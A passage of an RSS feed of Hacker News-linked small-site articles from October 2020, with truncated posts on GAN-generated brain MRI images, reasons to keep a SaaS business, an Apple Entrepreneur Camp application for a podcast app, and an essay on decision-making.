<p>Further on, they also tackled image denoising with deep learning networks, which is a common processing step in <a href="https://theaisummer.com/medical-image-processing/" target="_blank">MRI preprocessing</a>. Specifically, an autoencoder with <a href="https://theaisummer.com/skip-connections/" target="_blank">skip connections</a> for image denoising was used, showing that the model is able to denoise medical images.</p>

<p>They produced T1-weighted brain MRI images using a <a href="https://theaisummer.com/gan-computer-vision/#vanilla-gan-generative-adversarial-networks-2014" target="_blank">Generative Adversarial Network</a> (GAN) by learning from 528 examples of <strong>2D axial slices of brain MRI</strong>. Compared to a similar model in RGB images that use thousands of images, this is an important contribution. In order to validate that the synthesized images were unique, they performed classical similarity measures (cross-correlation) with the training set.</p>

<p>Real and synthesized images were then assessed in a blinded manner by two imaging experts providing an image quality score of 1-5. The high-level model architecture can be illustrated below:</p>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/gan-mri-architecture.png" alt="gan-mri-architecture">
<em>The proposed GAN architecture for MRI slices.</em></p>

<blockquote>
  <p>Main finding: the quality score of the synthetic image showed substantial overlap with that of the real images.</p>
</blockquote>

<h3 id="the-radiologists-perspective-on-synthetic-images">The radiologist‚Äôs perspective on synthetic images</h3>

<p>Let‚Äôs examine what the medical imaging experts thought of the produced images. First, an expert radiologist mentioned that <strong>despite the comparable quality, the synthetic images were immediately given away by anatomic abnormalities</strong>. Similarly, another expert noticed <strong>brighter intensities near the center of the image compared to the boundaries in the synthetic images</strong>. These comments represent challenges in image synthesis: anatomic accuracy and signal quality. Qualitative results are illustrated below:</p>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/brain-mri-gans.png" alt="brain-mri-gans">
<em>Brain MRI images, real and generated</em></p>

<p>Here is a representative synthesized image, as well as three real images with the highest correlation values.</p>

<blockquote>
  <p>Take-away note: the exploration of these unrealistic synthesized images may shed a light on <strong>possible structural and functional variants in brain anatomy found in healthy individuals</strong>.</p>
</blockquote>

<h3 id="medical-image-translation-using-cycle-gan">Medical image translation using Cycle-GAN</h3>

<p>Apart from image synthesis, 2D <strong>medical image translation</strong> has been also attempted. Welander et al. 2018 [8], used <strong><a href="https://theaisummer.com/gan-computer-vision-object-generation/#cycle-gan-unpaired-image-to-image-translation-using-cycle-consistent-adversarial-networks-2017" target="_blank">Cycle GAN</a></strong> on brain MRI. It was one of the first works on medical image translation, specifically from <strong><a href="https://theaisummer.com/medical-image-deep-learning/" target="_blank">T1 MRI to T2 MRI</a></strong> and vice versa.</p>

<p>Since <strong>Cycle GAN</strong> can learn to translate one domain to another and backward, it is interesting to see this concept in different medical image modalities. Briefly, instead of a single generator from <strong><a href="https://mrimaster.com/characterise%20physics.html" rel="noopener" target="_blank">T1 to T2</a> MRI</strong>, this model trains <strong>in parallel</strong> another generator to learn the inverse mapping from <strong>T2 to T1</strong>. Ideally, a T1 MRI that is translated to T2 and then again back to T1 through the 2 generators will result in the initial image. By constraining an ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://theaisummer.com/mri-beyond-segmentation/">https://theaisummer.com/mri-beyond-segmentation/</a></em></p>]]>
            </description>
            <link>https://theaisummer.com/mri-beyond-segmentation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24935255</guid>
            <pubDate>Thu, 29 Oct 2020 20:20:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Shouldn‚Äôt Sell Your SaaS Business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24935241">thread link</a>) | @andygcook
<br/>
October 29, 2020 | https://chrisgimmer.com/why-you-shouldnt-sell-your-saas-business/ | <a href="https://web.archive.org/web/*/https://chrisgimmer.com/why-you-shouldnt-sell-your-saas-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>If you run a SaaS business,&nbsp;there&nbsp;are plenty of great reasons why you might want to sell it one day. Whether you‚Äôre looking to take some chips off the table or move on to the next project, it can often make a lot of sense.</p>
<p>If you are thinking about selling, you‚Äôll find that there is no shortage of resources on <a href="https://feinternational.com/blog/saas-metrics-value-saas-business/" target="_blank" rel="noopener noreferrer">how to value a SaaS business</a>&nbsp;and <a href="https://tylertringas.com/selling-my-bootstrapped-saas-business/" target="_blank" rel="noopener noreferrer">how to go about selling it</a>. However, there‚Äôs not nearly as much emphasis placed on the merits of holding on to a SaaS business and going the distance.</p>
<p>As someone who‚Äôs run a SaaS business for the past 5 years and someone who‚Äôs participated in a few acquisition talks, I‚Äôve grown to appreciate some of the benefits of maintaining ownership. As a result, I thought it would be interesting to present some of the reasons why you might NOT want to sell your SaaS business.</p>
<p>Now, my goal here is not to convince you to never sell your business. In fact, I think it‚Äôs important to operate your business as though you <em>could</em>&nbsp;sell if you wanted to.</p>
<p>Rather, my goal is simply to point out some of the things you might not be thinking of. That way, you can make a more informed decision about whether or not it makes sense to sell your business after considering all of your own unique circumstances.</p>
<p>I also want to point out that for the sake of this post I‚Äôm mainly talking about ‚Äúfinancial acquisitions‚Äù where buyers are typically offering 3-5x multiples of annual <a href="https://www.quietlightbrokerage.com/sellers-discretionary-income/" target="_blank" rel="noopener noreferrer">seller‚Äôs discretionary earnings (SDE)</a>. If a strategic buyer comes along and offers you a crazy multiple for your business,&nbsp;then you should probably take the deal.</p>
<p>With that out of the way, here are some of the reasons you might not want to sell your SaaS business.</p>
<h2 id="h.sdhy6tlrdfd1">1. You‚Äôll probably leave money on the table</h2>
<p>Back in 2017, I met a fairly well known marketer and founder who‚Äôs acquired a few SaaS apps and grew them into highly profitable businesses. After chatting with him for a while, he mentioned that if we were ever considering selling Snappa to let him know.</p>
<p>At the time, we weren‚Äôt actively looking to sell Snappa but I was curious to find out how they would value our business and what valuation he‚Äôd be willing to pay.</p>
<p>After sharing some of our metrics and describing how we ran the business, him and his business partner passed on making an offer. He mentioned&nbsp;that they couldn‚Äôt find any low hanging fruit and felt that acquiring it for more than a 3x SDE multiple would leave them with little margin of safety. At the time, we were only doing $33k in monthly recurring revenue (MRR) so even if we had sold for a 5x multiple we would have left <strong>significant</strong>&nbsp;money on the table.</p>
<p>Fast forward to the spring of 2019 and we received an email from a potential acquirer who‚Äôs been very interested in Snappa over the past few years. Every time he expressed interest in buying Snappa, I politely declined and said we didn‚Äôt have much interest in selling given the growth trajectory we were on.</p>
<p>This time around, he seemed very motivated to make a deal and was throwing around multiples on the very high end of what a financial acquisition would typically go for. After sharing our metrics and opening up the books, he made a very attractive offer which kicked off due diligence from the both of us.</p>
<p>Long story short, some issues cropped up during the deal and we ultimately pulled out of it. The good news is that it ended up being a <em>huge</em>&nbsp;blessing in disguise and completely changed my thoughts around selling our business.</p>
<p>Bringing it back to financials though, we again would have left <strong>a lot </strong>of money on the table had we sold. While we were negotiating a sale price, Snappa was generating $67k MRR. Today, Snappa generates $134k MRR, which is exactly <strong>double</strong>&nbsp;what we were generating just a year and a half ago!</p>
<p>More importantly, Snappa has gotten even more profitable as we‚Äôve continued to spread more revenue over fewer costs. To put this all into perspective, we could probably sell Snappa for 2.5x more today than we could have back in the spring of 2019.</p>
<p>To illustrate this even more clearly, here‚Äôs a graph showing our all-time MRR and when these potential deals were being discussed.</p>
<p><img loading="lazy" src="https://chrisgimmer.com/wp-content/uploads/2020/10/acquisition-talks.jpg" alt="acquisition talks" width="1600" height="688" srcset="https://chrisgimmer.com/wp-content/uploads/2020/10/acquisition-talks.jpg 1600w, https://chrisgimmer.com/wp-content/uploads/2020/10/acquisition-talks-300x129.jpg 300w, https://chrisgimmer.com/wp-content/uploads/2020/10/acquisition-talks-1024x440.jpg 1024w, https://chrisgimmer.com/wp-content/uploads/2020/10/acquisition-talks-768x330.jpg 768w, https://chrisgimmer.com/wp-content/uploads/2020/10/acquisition-talks-1536x660.jpg 1536w" sizes="(max-width: 1600px) 100vw, 1600px"></p><p>You can see that our business has grown consistently over time and that selling it at any point along the way would have been a mistake. Although this post suffers from survivorship bias and our growth has accelerated due to the coronavirus, it is not uncommon at all for SaaS businesses to continue growing for many years. After all, this is the biggest benefit of starting a SaaS business; it might take a while to get going but once you‚Äôve got product/market fit they usually keep compounding.</p>
<p>The ultimate point I want to make is this:</p>
<p><em>If your business continues to grow (even modestly), it will never make sense to sell it for a 3-5x SDE multiple, strictly from a financial standpoint. </em></p>
<p>The only caveat here is whether or not you can deploy the sale proceeds into another project/investment that will yield an ever higher rate of return than your current business.</p>
<p>It‚Äôs also worth mentioning that if your SDE gets high enough, holding out for the sake of more money becomes less important. If you net $3M ‚Äì $5M after-tax from the sale of your SaaS business and park the proceeds in an index fund, <a href="https://www.mrmoneymustache.com/2012/05/29/how-much-do-i-need-for-retirement/" target="_blank" rel="noopener noreferrer">a safe withdrawal rate of 4%</a>&nbsp;would give you $120k ‚Äì $200k of income. This would essentially give you an infinite runway if you really just want to move on to the next thing.</p>
<h2 id="h.5qi198x8pile">2. You‚Äôll lose a reliable income stream</h2>
<p>When you‚Äôre thinking about selling your business, visualizing a huge chunk of cash in your bank account sounds very appealing. If your SaaS generates $25k of SDE per month, you could sell it for somewhere between $1M ‚Äì $1.5M.</p>
<p>Aside from the large tax bill you‚Äôll have to pay, there are other issues with trading a reliable income stream for a lump sum of cash‚Ä¶</p>
<p>Without an additional income stream, you will need to dip into that $1M in order to pay for your living expenses. If you don‚Äôt get another project off the ground in a reasonable time frame, you will then start depleting your savings.</p>
<p>The other problem is that cash in your bank account will continue to rot and lose purchasing power every single year. And with interest rates currently pegged at 0%, you‚Äôll be forced to invest this money in the stock market (<a href="https://chrisgimmer.com/bitcoin-reserve-asset/">or bitcoin</a>) just to keep up with inflation.</p>
<p>Now imagine if you sold your SaaS business back in February 2019 and you parked your money in an S&amp;P 500 index fund. Just one month later, $1M would have decreased to $672k. How would that make you feel? Would you have stomached the volatility?</p>
<p>Fortunately, the markets have rebounded very quickly (mostly thanks to QE + stimulus), but the S&amp;P 500 is currently trading below the February 2019 peak. This means that, financially speaking, you‚Äôd be worse off today than you would have been when you sold your business.</p>
<h2 id="h.xutqxbophzg7"><img loading="lazy" src="https://chrisgimmer.com/wp-content/uploads/2020/10/sp500-return.jpg" alt="S&amp;P 500 returns" width="1600" height="939" srcset="https://chrisgimmer.com/wp-content/uploads/2020/10/sp500-return.jpg 1600w, https://chrisgimmer.com/wp-content/uploads/2020/10/sp500-return-300x176.jpg 300w, https://chrisgimmer.com/wp-content/uploads/2020/10/sp500-return-1024x601.jpg 1024w, https://chrisgimmer.com/wp-content/uploads/2020/10/sp500-return-768x451.jpg 768w, https://chrisgimmer.com/wp-content/uploads/2020/10/sp500-return-1536x901.jpg 1536w" sizes="(max-width: 1600px) 100vw, 1600px"></h2>
<p>In my case, short-term volatility doesn‚Äôt bother me at all when it comes to investing. When the market crashed in March, I watched my portfolio of high growth tech stocks get crushed along with my personal investment in bitcoin. However, I didn‚Äôt panic or make any rash decisions because I don‚Äôt rely on these investments to pay the bills or perform in the short-term. Thanks to this patience, my portfolio has not only recovered, but it has significantly outperformed the broader market this year.</p>
<p>One of the reasons I was able to remain calm is because I have a SaaS business that kicks off reliable cash flow. This allows me to focus my investing on highly attractive long-term opportunities without worrying about short-term volatility. So far in my investing career, this has worked out very well.</p>
<p>If we had sold Snappa and I needed to protect my nest egg, I likely would have changed my investing approach to something more conservative in order to avoid big drawdowns. This would have put me in a much worse position than I‚Äôm in today.</p>
<h2 id="h.3uryscj59qwu">3. Acquisitions can be distracting</h2>
<p>When selling a business, something that often gets overlooked is the time, resources, and mental energy that‚Äôs required during the process. Depending on the size and complexity of the deal, you may need to dedicate the majority of your time over several months to ensure that the deal closes. If you want a detailed account of what this can look like, I really enjoyed <a href="https://www.startupsfortherestofus.com/episodes/episode-298-a-startup-acquisition-story" target="_blank" rel="noopener noreferrer">Rob Walling‚Äôs account of the Drip acquisition</a>.</p>
<p>Every hour that you spend on acquisition talks or due diligence is an hour that you‚Äôre not spending on growing your businesses. Also, the further down the process you get, and the more time that you sink in, the more demoralizing it becomes if the deal doesn‚Äôt close.</p>
<p>Another thing worth considering is how you choose to communicate with employees. Obviously, you don‚Äôt want to tell your employees about an acquisition at the LOI stage when the buyer hasn‚Äôt done the full due diligence. However, as part of the due diligence, or as the deal approaches closing, you may need to loop in some of your key employees. If the deal doesn‚Äôt go through, your employees could then get spooked and start looking for opportunities elsewhere if they think you‚Äôre going to sell the company.</p>
<h2 id="h.cvcpn4f4m311">4. You‚Äôll have to say goodbye to your team</h2>
<p>Speaking of employees, <a href="https://chrisgimmer.com/building-a-great-team/">building an amazing team</a>&nbsp;has been one of the most rewarding parts about being a founder. It truly is a joy to work with every single person on our team. Although we only hired our first employee in 2016, I‚Äôm happy to say that not a single person has left the company.</p>
<p>In addition to all the time we‚Äôve spent working together remotely, we‚Äôve also had some amazing in-person experiences and created lasting memories that I‚Äôll never forget. For these reasons, it would be really hard to say goodbye to all of the great people that I work with.</p>
<p>From a business perspective, ‚ÄòA‚Äô players are also worth their weight in gold and are not easily replaced. Given the inherent leverage embedded in a SaaS business, a programmer or marketer who‚Äôs 2x better than their counterpart can realistically provide 5x better returns for the business.</p>
<p>If you sell off the business and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chrisgimmer.com/why-you-shouldnt-sell-your-saas-business/">https://chrisgimmer.com/why-you-shouldnt-sell-your-saas-business/</a></em></p>]]>
            </description>
            <link>https://chrisgimmer.com/why-you-shouldnt-sell-your-saas-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24935241</guid>
            <pubDate>Thu, 29 Oct 2020 20:18:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Applying for Apple Entrepreneur Camp for Black Founders]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24935152">thread link</a>) | @oivviopolite
<br/>
October 29, 2020 | https://liberationtech.net/applying-for-apple-entrepreneur-camp-for-black-founders/ | <a href="https://web.archive.org/web/*/https://liberationtech.net/applying-for-apple-entrepreneur-camp-for-black-founders/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
            
            <div id="ajax-container">
<div>
  <article>
      
      <div>
          <p>Apple is running an "Entrepreneur Camp" for black founders and applications are open. As far as I can tell it's their first go at it. Previously they've run events for female founders.</p>
<p>If you get in you'll supposedly get access to assistance from Apple engineers. I don't know how extensive that access will actually be, but I'm dying to find out. Here's my application. Apple's questions are in bold and my answers in regular. Wish me luck :)</p>

<p><strong>Organization</strong></p>
<p><strong>Apple Entrepreneur Camp is for organizations worldwide with a Black founder, co-founder, or CEO. Each organization may bring up to three attendees. The Black founder, co-founder, or CEO and at least one Black developer (if not a sole proprietorship) must attend. The third attendee may be any racial background.</strong></p>
<p>Oivvio Polite</p>
<p><strong>App Name</strong></p>
<p>Season</p>
<p><strong>Website</strong></p>
<p><a href="https://seasonpods.com/">seasonpods.com</a></p>
<p><strong>Describe your organization‚Äôs mission in one sentence.</strong></p>
<p>Ultimately to liberate people through the use of technology, but on a day to day basis I run it to pay the bills :)</p>
<p>Season is a podcast player containing only limited series and audio drama where one story is told over multiple episodes. These kinds of podcasts are very popular but are sort of shoehorned in to the podcast format that is centered around free standing episodes, feeds and subscriptions. In a regular podcast player it can actually be a bit tricky to 1) find this content and 2) to play all episodes in the right order.</p>
<p><strong>Company Size</strong></p>
<p>Sole proprietorship/single person business</p>
<p><strong>Number of Black Developers Employed by Your Company</strong></p>
<p>1 - 2</p>
<p><strong>What is the technical skill level of your development team on Apple platforms?</strong></p>
<p>Intermediate</p>
<p><strong>Has your organization received any investments or grants from external investors?</strong></p>
<p>No</p>
<p><strong>Do you plan to raise money in the future?</strong></p>
<p>No</p>
<p><strong>Are you the founder, co-founder, or CEO?</strong></p>
<p>Yes</p>
<p><strong>If selected, will you be managing your organization‚Äôs involvement with the program?</strong></p>
<p>Yes</p>
<h2>Your App</h2>
<p><strong>Apple Entrepreneur Camp is designed to provide code level assistance as you create your next generation app using native Apple technologies. You must have a developed app or fully functional build that you can demo live.</strong></p>
<p><strong>How far along are you in the development of your app?</strong></p>
<p>Available on the App Store</p>
<p><strong>TestFlight, App Store, or .IPA download link</strong></p>
<p><a href="https://apps.apple.com/se/app/season-podcasts/id1504295207">https://apps.apple.com/se/app/season-podcasts/id1504295207</a></p>
<p><strong>Tell us about the app you‚Äôre developing. What problem is it trying to solve?</strong></p>
<p>The app is live in the App Store but limited to Sweden for the time being. Here's the TestFlight link: <a href="https://testflight.apple.com/join/OPSYw5qV">https://testflight.apple.com/join/OPSYw5qV</a> usable in all regions.</p>
<p>Season is a podcast player containing only limited series and audio drama where one story is told over multiple episodes. These kinds of podcasts are very popular but are sort of shoehorned in to the podcast format that is centered around standalone episodes, feeds and subscriptions.</p>
<p>In a regular podcast player it can actually be a bit tricky to 1) find this content and 2) play all episodes in the right order.</p>
<p><strong>Who is your app intended for and what solutions do they currently use? What‚Äôs unique about your solution?</strong></p>
<p>People who enjoy binging on well produced limited series and audio drama podcasts. Today they are using Apple podcasts and Spotify. Limited series are heavily over represented in the Apple podcasts charts which is a strong indicator that an app specifically for this kind of content could do well.</p>
<p>Half of what makes Season better is the curation. If you're into limited series Season makes it sooo much easier to find stuff you'll like. The other half is the player experience that is tailored to multi episode shows, using the <strong>season</strong> rather than the feed as it's central organizational unit.</p>
<p><strong>On which platforms do you plan to release your app?</strong></p>
<p>iOS</p>
<p>iPadOS</p>
<p><strong>What key Apple technologies have you integrated or do you plan to integrate into your app?</strong></p>
<p>SwiftUI</p>
<p><strong>What developer tools do you currently use?</strong></p>
<p>Xcode</p>
<p><strong>What programming languages do you currently use for app development?
Swift</strong></p>
<p>Swift</p>
<h2>The Future</h2>
<p><strong>Describe your strategy and road map for apps on Apple platforms, including new deployments, over the next 6, 12, or 24 months.</strong></p>
<p>I just released the app to the App Store last week, limiting it to the Swedish region. Over the next two months, using feedback from early users, I'll be polishing the app. I'm not really adding any features I'm just making the ones that are already in there look and work better. When that's done, hopefully before the end of the year I'll release to all regions. In early 2021 I hope to be able to focus more on getting the word out and reaching users.</p>
<p><strong>What would you like to gain from attending?</strong></p>
<p>Access to Apple engineers to help me with the code sounds like a complete dream. There have been so many times throughout this project that I've wished for something like that. I don't think that you'll be shocked to hear that your docs aren't always that helpful.</p>
<p>Beyond coding, getting more insights into the business side of having an app in the store would be tremendous. (This is my weak point. I have zero business experience.) Other than building a great app, what can I do to find my users?</p>
<p>Also getting to connect with other black techies would be fun.</p>
<p><strong>How would you define your success after attending?</strong></p>
<p>I'm sure this would be a great learning experience outside of any other outcomes. But viewed as a step on my journey to being successful as an indie app developer I'd also like to but a quantitative measure on it.
Let's say 10000 daily users by the end of 2021!</p>
<p><strong>If you are a for-profit business, how does your organization plan to sell and market its products/services?</strong></p>
<p>I plan to sell ad-space in the app for podcasts. A couple of other small podcast players are already doing this so it's a proven business model. I'm rather confident that I can make that work as long as I'm able to get a sufficient amount of users.</p>
<p><strong>If you've shared or considered sharing your coding knowledge and enthusiasm for computer science with others, let us know.</strong></p>
<p>I've done some teaching to design and illustration-students at a local arts collage (<a href="https://www.konstfack.se/">Konstfack</a>) here in Stockholm. I really enjoy it and would like to do more of it but the amount time of time I can devote to teaching is limited since the pay is abysmal.</p>
      </div>
  </article>
</div>
            </div>
	</div></div>]]>
            </description>
            <link>https://liberationtech.net/applying-for-apple-entrepreneur-camp-for-black-founders/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24935152</guid>
            <pubDate>Thu, 29 Oct 2020 20:11:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Good Judgment and Decision-Making: The Science and Practice]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24934909">thread link</a>) | @maxan
<br/>
October 29, 2020 | https://max2c.com/on-good-judgment-and-decision-making-science-practice/ | <a href="https://web.archive.org/web/*/https://max2c.com/on-good-judgment-and-decision-making-science-practice/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4018">
			
	<!-- .entry-header -->

	<div>
		
<p>Imagine you‚Äôve made two decisions. One has resulted in a loss of 10 thousand dollars, while the other resulted in a gain of 10 thousand dollars. Would you say that the former was a bad decision, and the latter was a good one?</p>



<p>The first response that usually comes to everyone‚Äôs mind is ‚Äúof course, the second decision was better‚Äù. But this is not necessarily the case. Can you think of a scenario where your response would be the opposite?</p>



<p>I‚Äôve been thinking and reading about decision-making for many years while trying to put everything I learned into practice. Below, I summarize the strategies and mental models that I personally found most useful.</p>



<h2>The Process vs. The Outcome</h2>



<p>We all have a natural tendency to judge decisions based on their outcomes. This is not the worst heuristic, as there is a correlation between the quality of decisions and outcomes. But this heuristic has a major flaw ‚Äî it doesn‚Äôt account for luck and incomplete information.</p>



<p>An individual can make a bad impulse decision yet get lucky and get a positive outcome. An extreme example could be buying a lottery ticket and winning. A less extreme example could be taking a high-stakes risky business decision without putting much thought into it. Should those decisions still be considered <em>good?</em></p>



<p>On the other hand, another individual might dedicate the appropriate time to making a business decision, follow a thorough process, analyze all the available information, make the reasonable conclusions, and make an educated long-term bet. Now imagine that the business environment transforms in the upcoming years in a way <em>that could not have been predicted.</em> So the decision leads to a negative outcome. For example, a product launch fails. Does it mean the decision was bad?</p>



<p>Arguably, the first individual made a bad decision, and the second one made a good one. This might contradict conventional wisdom, but if you really think about it, the first person simply got lucky after following a bad process. And the second person did everything they could to make the optimal decision and took a calculated risk. That the outcome wasn‚Äôt positive in this particular case doesn‚Äôt tell us much about the person‚Äôs decision-making ability or judgment.</p>



<p>One reason it‚Äôs so hard to evaluate the process instead of the outcome in the business context is that it flies in the face of many other best practices. Hiring managers believe that past performance is the best predictor of success. Leaders extol results-driven culture. OKRs are set around outcomes ‚Äî not processes.</p>



<p>But a deeper reason is that it‚Äôs more difficult to evaluate and establish processes. It‚Äôs much easier to evaluate results. Evaluating processes would require a deeper understanding of the context and how that context has evolved over time. It would also require disentangling various drivers of the outcome. You might be thinking‚Ä¶ Who‚Äôs got time for <em>that</em>?</p>



<p>Realistically, I don‚Äôt see the outcome-based evaluation of decisions going away completely any time soon. But it doesn‚Äôt mean we cannot iteratively improve the process so we get better over time.</p>



<p>So what can we do to improve the process?</p>



<h2>Decision Journal</h2>



<p>A simple yet powerful idea is to document big decisions. Just like venture capitalists prepare <a href="https://www.bvp.com/memos" target="_blank" rel="noreferrer noopener">detailed investment memos</a> before investing in startups where they weigh all the pros and cons, we can also write summaries for big decisions in business and life.</p>



<p>In addition to outlining all the available options and considering their pros and cons, here are some additional things to consider.</p>



<h2>The Main Goal and Frameworks</h2>



<p>Asking ‚Äúwhat are we optimizing for?‚Äù might sound obvious but clarifying what you‚Äôre optimizing for can simplify the entire process. </p>



<p>Asking this question is particularly useful when a group of people is making a decision. You might assume that everyone has the same goal in mind, but once you ask, you might realize that people might have different opinions about the most important goal or metric to optimize for.</p>



<p>And if you‚Äôre into spreadsheets, you can even come up with a list of criteria and assign weights to calculate the expected outcomes. For example:</p>



<div><figure><img loading="lazy" src="https://max2c.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-13.36.33.png" alt="Decision-making framework: options, criteria, weights, payoffs, and expected value." width="786" height="245" srcset="https://max2c.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-13.36.33.png 1048w, https://max2c.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-13.36.33-480x149.png 480w, https://max2c.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-13.36.33-666x207.png 666w, https://max2c.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-13.36.33-768x239.png 768w" sizes="(max-width: 786px) 100vw, 786px"></figure></div>



<p>Expected value = the probability of a certain outcome * the payoff in case of this outcome. </p>



<p>The payoff can either be expressed in monetary value or subjectively perceived value ‚Äî for example, how happy you would be on the 10-point scale.</p>



<p>Developing a framework like this can be useful for thinking and clarifying what really matters to you and aligning with others. But quantifying things can also give you a false sense of confidence so I‚Äôd use this approach with caution.</p>



<p>Want to take it up a notch? Look into <a href="https://en.wikipedia.org/wiki/Decision_tree" target="_blank" rel="noreferrer noopener">decision trees</a>.</p>



<h2>Expected Value vs. the Worst Possible Downside</h2>



<p>Besides considering the most likely outcome or the expected value, I find it very useful to consider the worst possible downside.</p>



<p>Imagine you have two investment opportunities. One is expected to grow 7% annually on average in the long-term and the other is expected to grow 10%. Based on this information alone, the second one looks like a better investment. At least until you account for volatility. The extreme case of volatility is that the investment goes to zero or close to zero.</p>



<p>I personally find it useful to think about the worst possible outcome I would be comfortable with in addition to considering the expected value.</p>



<p>What if I told you that the value of the first investment has less than a 0.01% chance of dropping to near zero, while the value of the second investment has a 20% chance of doing so, how would it change your decision?</p>



<h2>A Portfolio of Bets</h2>



<p>Your response to the previous question might have been ‚Äúit depends‚Äù. It might depend on a number things ‚Äî such as your risk aversion, personal situation, or whether this is the only investment or one of many.</p>



<p>The portfolio approach is often used in finance. It‚Äôs been shown that most people would be better off allocating most of their investments into low-fee portfolios that track the overall market rather than picking individual stocks. Similarly, venture capitalists always spread out their investments across many startups.</p>



<p>And a similar framework can be applied in business and life ‚Äî it‚Äôs sometimes useful to ask yourself a question ‚Äúam I making and testing multiple bets here or primarily committing to one thing?‚Äù</p>



<h2>Optionality vs. Efficiency</h2>



<p>It‚Äôs useful to consider the trade-off between future optionality and efficiency.</p>



<p>Some business decisions might bring in more revenue or reduce costs, but they reduce your future options. Many companies optimize for efficiency so they could grow faster or improve their bottom line. Generally, public markets and quarterly financial reporting also incentivize them to do so. But sometimes over-optimizing leads to reduced optionality in the future.</p>



<p>Nassim Taleb developed and popularized the idea of <a href="https://en.wikipedia.org/wiki/Antifragility" target="_blank" rel="noreferrer noopener">antifragility</a> which is highly related to optionality. Wikipedia describes antifragility as ‚Äúa property of systems that increase in capability to thrive as a result of stressors, shocks, volatility, noise, mistakes, faults, attacks, or failures‚Äù.</p>



<p>What‚Äôs interesting is that sometimes building a system like this or putting yourself in a situation like this requires a certain redundancy which is the opposite of efficiency.</p>



<p>The PPE shortage in the US during the 2020 COVID-19 pandemic is sometimes viewed as a recent example of optimizing for efficiency at the expense of optionality. If you focus on efficiency and optimize for the short-term demand, you might choose to store only a limited amount ‚Äújust in case‚Äù and purchase the equipment from countries that can provide it at a lowest cost. However, if you want to optimize for optionality, resilience, and antifragility, you might choose to have more redundant storage and manufacture some equipment internally ‚Äî so you don‚Äôt rely on other countries as much.</p>



<p>Similarly, certain choices in life and business create more options in the future than others.</p>



<h2>Let People Form Their Own Opinions First</h2>



<p>To quote Daniel Kahneman, a Nobel prize-winning psychologist and economist:</p>



<p><em>‚ÄúSubjectively, it feels like you believe in something because you have the arguments for it. But it works the other way around. You believe in the conclusion, and then you create supporting arguments. That‚Äôs fundamental. Why do people believe in these conclusions? Partly because people we love and trust believe in the same conclusion.‚Äù</em></p>



<p>Our brains are naturally biased to pay attention to what others believe and generally follow them. So if one person in a group confidently announces their opinion first, many people will be likely to follow them. You can see this effect on steroids if that first-to-speak person is a boss.</p>



<p>This is why it‚Äôs usually better to ask people to form their opinions first and, ideally, write them down before discussing them with others. I made sure my team utilized this strategy when running customer research and focus groups with multiple people being interviewed at a time. Before discussing a topic as a group, we would present participants with a question and then ask them to write their opinions before discussing them. This always leads to a greater diversity of ideas.</p>



<h2>First Principles Thinking</h2>



<p>It‚Äôs also been shown that people are more likely to accept evidence that is supporting their pre-existing beliefs and more likely to challenge evidence that is contradicting them. <a href="https://en.wikipedia.org/wiki/Motivated_reasoning" target="_blank" rel="noreferrer noopener">Motivated reasoning</a> and <a href="https://en.wikipedia.org/wiki/Confirmation_bias" target="_blank" rel="noreferrer noopener">confirmation bias</a> are well researched.</p>



<p>First-principles reasoning is the opposite of that. You don‚Äôt reason by analogy, assume that things can only be the way they are today, or copy what others believe.</p>



<p>Instead, you start with the underlying, well-established facts and build your beliefs and conclusions independently based on these facts.</p>



<p>Or you can start by considering commonly held beliefs and deconstructing them with the ‚Äú<a href="https://en.wikipedia.org/wiki/Five_whys" target="_blank" rel="noreferrer noopener">five whys</a>‚Äù ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://max2c.com/on-good-judgment-and-decision-making-science-practice/">https://max2c.com/on-good-judgment-and-decision-making-science-practice/</a></em></p>]]>
            </description>
            <link>https://max2c.com/on-good-judgment-and-decision-making-science-practice/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934909</guid>
            <pubDate>Thu, 29 Oct 2020 19:53:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interview: Amiga Artist Jim Sachs (2020)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24934813">thread link</a>) | @erickhill
<br/>
October 29, 2020 | https://www.amigalove.com/viewtopic.php?f=5&t=1618 | <a href="https://web.archive.org/web/*/https://www.amigalove.com/viewtopic.php?f=5&t=1618">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.amigalove.com/viewtopic.php?f=5&amp;t=1618</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934813</guid>
            <pubDate>Thu, 29 Oct 2020 19:47:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Learn Machine Learning and Deep Learning: A Guide for Software Engineers]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24934686">thread link</a>) | @renanmoura
<br/>
